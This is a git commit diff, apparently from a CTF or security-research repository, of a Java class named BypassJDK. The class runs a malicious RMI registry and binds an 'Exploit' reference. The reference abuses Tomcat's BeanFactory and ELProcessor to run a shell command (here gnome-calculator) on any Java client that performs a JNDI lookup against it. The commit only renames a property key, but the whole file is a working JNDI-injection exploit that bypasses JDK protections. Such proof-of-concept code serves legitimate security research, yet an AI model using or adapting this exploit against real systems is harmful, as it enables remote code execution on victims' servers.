e2539a011b45a36a505fafd5d89822ac8aaadf22
lab4ctf <dangkhaikma>
2021-03-14 21:59:17 -0700

    code for research java

--- src/main/java/rmi/BypassJDK.java
+++ src/main/java/rmi/BypassJDK.java
@@ -14,8 +14,8 @@ public class BypassJDK {
     public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
         Registry registry = LocateRegistry.createRegistry(1092);
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
-        ref.add(new StringRefAddr("KINGX", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','gnome-calculator']).start()\")"));
+        ref.add(new StringRefAddr("forceString", "mlem=eval"));
+        ref.add(new StringRefAddr("mlem", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','gnome-calculator']).start()\")"));
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
         registry.bind("Exploit", referenceWrapper);
     }
